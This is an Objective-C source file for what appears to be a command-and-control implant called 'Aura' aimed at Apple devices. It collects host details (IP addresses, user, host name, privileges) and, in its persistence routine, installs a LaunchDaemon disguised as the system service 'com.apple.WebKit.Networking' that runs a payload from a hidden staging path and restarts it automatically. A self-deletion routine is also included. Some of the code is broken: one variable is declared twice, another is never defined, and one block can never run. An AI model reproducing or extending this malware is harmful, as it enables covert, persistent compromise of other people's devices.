#import "SystemInfoHelper.h"
#import "C2Task.h"
#import "NSTask.h"

@implementation SystemInfoHelper

+ (NSString *)getInternalIPAddress {
    NSString *address = @"error";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;

    success = getifaddrs(&interfaces);
    if (success == 0) {
        temp_addr = interfaces;
        while (temp_addr != NULL) {
            if (temp_addr->ifa_addr->sa_family == AF_INET) {
                if ([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"]) {
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
    }
    freeifaddrs(interfaces);
    return address;
}

+ (NSString *)getExternalIPAddress {
    NSURL *url = [NSURL URLWithString:@"http://ipinfo.io/ip"];
    NSError *error;
    NSString *externalIP = [NSString stringWithContentsOfURL:url encoding:NSUTF8StringEncoding error:&error];
    if (error) {
        NSLog(@"[ERROR] Unable to fetch external IP: %@", error.localizedDescription);
        return @"error";
    }
    return [externalIP stringByTrimmingCharactersInSet:[NSCharacterSet newlineCharacterSet]];
}

+ (NSString *)getArchitecture {
    cpu_type_t cpuType;
    size_t size = sizeof(cpuType);

    // Get the CPU type
    if (sysctlbyname("hw.cputype", &cpuType, &size, NULL, 0) != 0) {
        return @"Error getting CPU type";
    }
    
    NSString *archString = @"unknown";
    if (cpuType == CPU_TYPE_ARM64) {
        archString = @"arm64";
    } else if (cpuType == CPU_TYPE_ARM) {
        archString = @"arm";
    }

    return archString;
}

+ (NSInteger)getPID {
    return [[NSProcessInfo processInfo] processIdentifier];
}

+ (NSString *)getUser {
    return NSUserName();
}

+ (NSString *)getHost {
    return [[NSProcessInfo processInfo] hostName];
}

+ (NSString *)getOS {
    UIDevice *device = [UIDevice currentDevice];
    NSString *systemName = [device systemName]; 
    NSString *systemVersion = [device systemVersion];

    NSString *osDetails = [NSString stringWithFormat:@"%@ %@", systemName, systemVersion];
    return osDetails;
}

+ (NSString *)getProcessName {
    return [[NSProcessInfo processInfo] processName];
}


+ (NSString *)getDomain {
    char domainName[256];
    /// If we could not find the domain name... default local
    if (getdomainname(domainName, sizeof(domainName)) != 0 || strlen(domainName) == 0) {
        return @"local";
    }
    return [NSString stringWithUTF8String:domainName];
}

+ (void)takeScreenshotWithTask:(id)sender {
    // TODO: Implement
}

+ (BOOL)isRootUser {
    return (geteuid() == 0);
}

/// Is the agent currently installed?
/// - Plist exists
/// - Service is loaded
/// - Payload image exists
+ (BOOL)agentIsInstalled {
    // Check if running as root
    BOOL isRoot = [self isRootUser];
    if (!isRoot) {
        NSLog(@"❌ Not running as root. Assuming the agent is not installed.");
        return NO;
    }

    // Path to the plist
    NSString *plistPath = @"/Library/LaunchDaemons/com.apple.WebKit.Networking.plist";
    
    // Check if the plist file exists
    if (![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
        NSLog(@"Aura agent is not currently installed: %@", plistPath);
        return NO;
    }

    // Check if the service is loaded using exit code
    NSTask *task = [[NSTask alloc] init];
    task.launchPath = @"/bin/launchctl";
    task.arguments = @[@"list", @"com.apple.WebKit.Networking"];

    [task launch];
    [task waitUntilExit];

    int terminationStatus = task.terminationStatus;

    // If the exit code is 118, the service is not loaded
    if (terminationStatus == 118) {
        NSLog(@"❌ Service is not loaded.");
        return NO;
    } else if (terminationStatus == 0) {
        NSLog(@"✅ Service is loaded.");
    } else {
        NSLog(@"❌ Unexpected exit code from launchctl: %d", terminationStatus);
        return NO;
    }

    // Check if the payload image (executable) exists
    NSDictionary *plistContents = [NSDictionary dictionaryWithContentsOfFile:plistPath];
    NSArray *programArguments = plistContents[@"ProgramArguments"];
    if (programArguments.count > 2) {
        NSString *payloadPath = programArguments[2]; // The path to the executable is the third argument

        // Check if the payload file exists
        if ([[NSFileManager defaultManager] fileExistsAtPath:payloadPath]) {
            NSLog(@"✅ Payload image exists: %@", payloadPath);
            return YES;
        } else {
            NSLog(@"❌ Payload image does not exist at path: %@", payloadPath);
            return NO;
        }
    } else {
        NSLog(@"❌ Invalid ProgramArguments in plist.");
        return NO;
    }
}



+ (BOOL)uninstallAgent {
    // Get the path of our executing image
    char pathBuffer[1024];
    uint32_t size = sizeof(pathBuffer);
    _NSGetExecutablePath(pathBuffer, &size);

    // Convert the C string to NSString and standardize the path
    NSString *executablePath = [NSString stringWithUTF8String:pathBuffer];
    NSString *standardizedPath = [executablePath stringByStandardizingPath];
    
    // Log the standardized path
    NSLog(@"Payload image path: %@", standardizedPath);

    // Check if the Agent exists before trying to remove it
    if ([[NSFileManager defaultManager] fileExistsAtPath:standardizedPath]) {
        NSError *error = nil;
        BOOL success = [[NSFileManager defaultManager] removeItemAtPath:standardizedPath error:&error];

        if (success) {
            NSLog(@"✅ Successfully deleted the Aura payload.");
            return YES;
        } else {
            NSLog(@"❌ Failed to delete the payload!! Error: %@", error);
            return NO;
        }
    } else {
        NSLog(@"✅ Payload is already deleted: %@", standardizedPath);
        return YES; // Assume success since it's already deleted
    }
}

+ (BOOL)persistAgent {
    // Check if running as root
    BOOL isRoot = [self isRootUser];
    if (!isRoot) {
        NSLog(@"❌ We're not running as root. Cannot persist Aura.");
        return NO;
    }

    /// Check if we can write to the LaunchDaemons directory by permissions
    NSString *launchDaemonsDirectory = @"/Library/LaunchDaemons/";
    if ([[NSFileManager defaultManager] isWritableFileAtPath:launchDaemonsDirectory]) {
        NSLog(@"✅ We can write to the LaunchDaemons directory.");
    } else {
        NSLog(@"❌ We cannot write to the LaunchDaemons directory.");
        return NO;
    }

    // 1. Create Launch Daemons if it does not exist
    BOOL isDirectory;
    NSString *launchDaemonsDirectory = @"/Library/LaunchDaemons/";
    if (![[NSFileManager defaultManager] fileExistsAtPath:launchDaemonsDirectory isDirectory:&isDirectory] || !isDirectory) {
        NSError *directoryError = nil;
        BOOL directoryCreated = [[NSFileManager defaultManager] createDirectoryAtPath:launchDaemonsDirectory withIntermediateDirectories:YES attributes:nil error:&directoryError];

        if (!directoryCreated) {
            NSLog(@"❌ Failed to create LaunchDaemons/ at: %@. Error: %@", launchDaemonsDirectory, directoryError);
            return NO;
        } else {
            NSLog(@"✅ Successfully created LaunchDaemons/ at: %@", launchDaemonsDirectory);
        }
    }

    
    // Dynamically create the plist
    // TODO: Get the execution path, get the shell path
    // Great! Now we'll write out the PLIST contents persisting Aura.
    NSDictionary *plistContents = @{
        @"Label": @"com.apple.WebKit.Networking",
        @"ProgramArguments": @[
            @"/bin/bash",
            @"-c",
            @"/tmp/var/db/com.apple.xpc.roleaccountd.staging/aura"
        ],
        @"RunAtLoad": @YES,
        @"KeepAlive": @YES
    };
    
    // Attempt to write the dictionary to the plist file
    NSError *writeError = nil;
    BOOL success = [plistContents writeToFile:plistPath atomically:YES];
    
    // Log the success/failure of the plist writing
    if (success) {
        NSLog(@"✅ Plist successfully written to: %@", plistPath);
    } else {
        NSLog(@"❌ Failed to write plist at: %@. Error: %@", plistPath, writeError);
        return NO;
    }

    // Load the plist with `/sbin/launchctl load -w /path/to/plist`
    NSTask *task = [[NSTask alloc] init];
    task.launchPath = @"/bin/launchctl";
    task.arguments = @[@"load", @"-w", plistPath];

    // Capture the standard output and standard error
    NSPipe *pipe = [NSPipe pipe];
    task.standardOutput = pipe;
    task.standardError = pipe;

    NSFileHandle *file = [pipe fileHandleForReading];

    [task launch];
    [task waitUntilExit];

    // Read the output
    NSData *data = [file readDataToEndOfFile];
    NSString *output = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

    // Log the output from launchctl
    NSLog(@"launchctl output: %@", output);
    
    // Log the termination status of the launchctl command
    NSLog(@"Loading plist with launchctl: termination status = %d", task.terminationStatus);

    // Validate and return the success of the launchctl command
    if (task.terminationStatus == 0 && ![output containsString:@"Operation not permitted"]) {
        NSLog(@"✅ Plist successfully loaded by launchctl.");
        return YES;
    } else {
        NSLog(@"❌ Failed to load plist with launchctl. Error: %@", output);
        return NO;
    }

    // Now, start the service using `launchctl kickstart`
    NSTask *kickstartTask = [[NSTask alloc] init];
    kickstartTask.launchPath = @"/bin/launchctl";
    kickstartTask.arguments = @[@"kickstart", @"-k", @"system/com.apple.WebKit.Networking"];
    
    NSPipe *kickstartPipe = [NSPipe pipe];
    kickstartTask.standardOutput = kickstartPipe;
    kickstartTask.standardError = kickstartPipe;

    NSFileHandle *kickstartFile = [kickstartPipe fileHandleForReading];
    
    [kickstartTask launch];
    [kickstartTask waitUntilExit];

    // Read the output from kickstart
    NSData *kickstartData = [kickstartFile readDataToEndOfFile];
    NSString *kickstartOutput = [[NSString alloc] initWithData:kickstartData encoding:NSUTF8StringEncoding];

    // Log the output from launchctl kickstart
    NSLog(@"launchctl kickstart output: %@", kickstartOutput);
    
    // Check if the service was successfully started
    if (kickstartTask.terminationStatus == 0 && ![kickstartOutput containsString:@"Operation not permitted"]) {
        NSLog(@"✅ Service com.apple.WebKit.Networking started successfully.");
        return YES;
    } else {
        NSLog(@"❌ Failed to start service com.apple.WebKit.Networking. Error: %@", kickstartOutput);
        return NO;
    }
}


@end
